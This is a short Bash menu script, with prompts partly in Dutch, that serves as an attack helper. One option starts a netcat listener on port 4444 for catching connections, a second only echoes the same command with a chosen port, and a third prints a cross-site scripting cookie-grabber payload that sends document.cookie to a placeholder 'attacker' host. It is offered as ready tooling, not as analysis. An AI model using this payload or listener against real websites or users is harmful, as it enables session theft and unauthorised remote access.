	echo
	echo "Select an option:"
	echo "   1) Gebruik de standaard poort."
	echo "   2) Gebruik je eigen poort."
    echo "   3) Extra."
	echo "   4) Exit "

	read -p "Option: " option
	until [[ "$option" =~ ^[1-4]$ ]]; do
		echo "$option: invalid selection."
		read -p "Option: " option
	done
	case "$option" in

		1)
        if [ "$EUID" -ne 0 ]
            then echo "Please run as root"
            exit
        fi

        echo "Set poort naar 4444"
        echo
        hostname -I 
        nc -nlvp 4444
        

		;;
		2)

          if [ "$EUID" -ne 0 ]
            then echo "Please run as root"
            exit
        fi

        echo "Kies je eigen port die je wil gebruiken."?
        read varname
        echo
        hostname -I 
        echo nc -nlvp $varname

		;;
        3)
            echo "Gebruik | <script>new Image().src='http://attacker:port/?cookie=' + encodeURI(document.cookie);</script> | voor de grabber."
		;;
		4)
            exit
		;;
esac